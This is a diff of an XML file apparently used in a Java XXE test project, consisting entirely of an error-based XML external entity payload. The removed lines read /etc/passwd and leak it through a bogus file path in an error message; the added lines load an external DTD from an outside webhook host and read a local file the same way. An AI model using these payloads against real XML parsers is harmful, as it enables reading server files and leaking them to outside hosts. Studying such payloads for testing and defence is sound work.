@@ -1,21 +1,14 @@
 <?xml version="1.0" ?>
-
 <!DOCTYPE message [
+        <!ENTITY % local_dtd SYSTEM "https://webhook.uutool.cn/4q9rn6ievea0">
 
-        <!ENTITY % NUMBER '
-
-        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-
+        <!ENTITY % test 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///D:\l11267\java\program\JavaTest\XXETest\src\main\resources\test.txt">
         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
-
         &#x25;eval;
-
         &#x25;error;
+        <!ELEMENT aa (bb'>
 
-        '>
-
-        %NUMBER;
-
+        %local_dtd;
         ]>
-
 <message>any text</message>
